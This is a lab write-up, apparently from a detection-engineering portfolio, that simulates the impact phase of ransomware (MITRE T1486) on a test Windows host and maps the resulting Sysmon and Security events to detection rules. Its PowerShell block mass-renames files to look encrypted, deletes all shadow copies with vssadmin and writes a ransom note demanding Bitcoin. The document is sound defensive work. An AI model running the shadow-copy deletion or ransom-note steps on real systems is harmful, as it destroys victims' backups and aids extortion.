# T1486 — Data Encrypted for Impact (Ransomware Simulation)

**Tactic:** Impact  
**MITRE Link:** https://attack.mitre.org/techniques/T1486/  
**Status:** ✅ Complete

---

## Why Attackers Use This

Ransomware operators encrypt victim files to extort payment. T1486 is the final phase of the kill chain — executed only after the attacker has achieved persistence, dumped credentials, and moved laterally. Three behaviors define modern ransomware impact:

1. **File encryption** — victim data rendered inaccessible with a unique key
2. **Shadow copy deletion** — removes Windows backup snapshots to prevent recovery without paying
3. **Ransom note drop** — instructs victim on payment method

**Why shadow copy deletion is critical to detect:**
`vssadmin delete shadows /all` is present in virtually every ransomware family — Conti, LockBit, BlackCat, REvil, Ryuk. It is one of the highest-fidelity ransomware indicators in Windows event logs.

**Real-world ransomware families:** Conti, LockBit 3.0, BlackCat/ALPHV, Ryuk, REvil, WannaCry.

---

## Attack Scenario

Simulating the impact phase of a ransomware attack on a Windows machine. A directory of victim files is created, mass-encrypted using file rename operations (simulating encryption), shadow copies are deleted to prevent recovery, and a ransom note is dropped.

**Machine:** THM-SOC-DC01.thm.soc  
**User:** THM\THM-Analyst

---

## Attack Commands Executed

```powershell
# Step 1 — Create victim files (simulating valuable data)
New-Item -Path "C:\Users\Public\victim_files" -ItemType Directory -Force
1..20 | ForEach-Object {
    New-Item -Path "C:\Users\Public\victim_files\document$_.txt" -ItemType File -Force
    Set-Content "C:\Users\Public\victim_files\document$_.txt" -Value "Sensitive data file $_"
}

# Step 2 — Simulate encryption (mass file rename to .encrypted)
Get-ChildItem "C:\Users\Public\victim_files\*.txt" | ForEach-Object {
    Rename-Item $_.FullName -NewName ($_.Name + ".encrypted")
}

# Step 3 — Delete shadow copies (prevent recovery)
vssadmin delete shadows /all /quiet

# Step 4 — Drop ransom note
$note = "YOUR FILES HAVE BEEN ENCRYPTED.`nSend 0.5 BTC to recover your data.`nContact: attacker@ransomware.onion"
Set-Content -Path "C:\Users\Public\victim_files\README_DECRYPT.txt" -Value $note
```

---

## Logs Generated

See [logs-observed.md](./logs-observed.md) for full lab evidence.

| Log Source | Event ID | Description | Captured |
|------------|----------|-------------|----------|
| Sysmon | **1** | `vssadmin.exe delete shadows /all /quiet` process creation | ✅ |
| Windows Security | 4688 | `vssadmin.exe` process creation with command line | ⚠️ Requires audit policy |
| Sysmon | 11 | Mass `.encrypted` file creation | ⚠️ Requires FileCreate config rule |

---

## Detection

- **Sigma Rule:** [sigma-rule.yml](./sigma-rule.yml)
- **Splunk SPL:** [splunk-spl.txt](./splunk-spl.txt)
- **Tuning Notes:** [tuning-notes.md](./tuning-notes.md)

---

## Screenshots

See [screenshots/](./screenshots/) for lab evidence.
